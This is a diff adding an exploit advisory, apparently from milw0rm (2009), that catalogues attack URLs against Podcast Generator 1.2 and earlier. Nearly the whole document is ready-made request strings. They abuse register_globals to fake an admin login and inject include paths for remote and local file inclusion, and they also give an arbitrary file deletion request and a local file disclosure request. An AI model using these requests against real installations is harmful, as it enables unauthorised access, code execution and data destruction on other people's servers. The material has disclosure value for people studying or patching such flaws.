@@ -1,0 +1,53 @@
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
+| Podcast Generator <= 1.2 GLOBALS[] Multiple Remote Vulnerabilities |
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
+| by staker - staker[at]hotmail[dot]it / http://zeroidentity.org     |
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
+
++-------------------------------------------------------------------------------------+
+| (Remote/Local) Arbitrary File Inclusions Vulnerabilities                            |  
++-------------------------------------------------------------------------------------+
+| Directory: /core/admin/ | register_globals=on                                       |
+| Directory: /core/       | allow_url_fopen=on   --> RFI                              |
+|                         | magic_quotes_gpc=off --> LFI                              | 
++-------------------------+-----------------------------------------------------------+
+| delete.php?GLOBALS[amilogged]=true&file[]&GLOBALS[absoluteurl]=                     |
+| admin.php?p=admin&GLOBALS[absoluteurl]=                                             |
+| categories.php?GLOBALS[amilogged]=true&categoriesenabled=yes&GLOBALS[absoluteurl]=  |
+| categories_add.php?GLOBALS[amilogged]=true&GLOBALS[absoluteurl]=                    |
+| categories_remove.php?GLOBALS[amilogged]=true&GLOBALS[absoluteurl]=                 |
+| createconfig.php?GLOBALS[amilogged]=true&GLOBALS[absoluteurl]=                      |
+| edit.php?GLOBALS[amilogged]=true&p=admin&do=edit&c=ok&GLOBALS[absoluteurl]=         |
+| editdel.php?GLOBALS[amilogged]=true&p=admin&GLOBALS[absoluteurl]=                   |
+| feedgenerate.php?GLOBALS[amilogged]=true&p=admin&do=generate&GLOBALS[absoluteurl]=  |
+| ftpfeature.php?GLOBALS[amilogged]=true&p=admin&&GLOBALS[absoluteurl]=               |
+| itunescategories.php?GLOBALS[amilogged]=true&GLOBALS[absoluteurl]=                  |       
+| login.php?GLOBALS[absoluteurl]=                                                     |
+| pgRSSnews.php?GLOBALS[absoluteurl]=                                                 |
+| podcastdetails.php?GLOBALS[amilogged]=true&GLOBALS[absoluteurl]=                    |
+| upload.php?GLOBALS[amilogged]=true&p=admin&do=upload&c=ok&GLOBALS[absoluteurl]=     |
+| showcat.php?GLOBALS[amilogged]=true&GLOBALS[absoluteurl]=                           |
++-------------------------------------------------------------------------------------+      
+| includes.php?GLOBALS[absoluteurl]=                                                  |
+| recent_list.php?GLOBALS[absoluteurl]=                                               |
++-------------------------------------------------------------------------------------+
+
++---------------------------------------------------------------+
+| Arbitrary Local File Deletion Vulnerability                   |
++---------------------------------------------------------------+
+| Directory: /core/admin/ | register_globals=on                 |  
++-------------------------+-------------------------------------+
+| delete.php?GLOBALS[amilogged]=true&file=[FILENAME]&ext=[EXT]  |
++---------------------------------------------------------------+ 
+ 
++-----------------------------------------------+
+| Local File Disclosure/Inclusion Vulnerability |
++-----------------------------------------------+
+| Directory: /core/ | register_globals=on       |
+|                   | magic_quotes_gpc=off      |
++-------------------+---------------------------+
+| themes.php?GLOBALS[theme_path]=               |
++-----------------------------------------------+ 
+
+
+# milw0rm.com [2009-06-02]
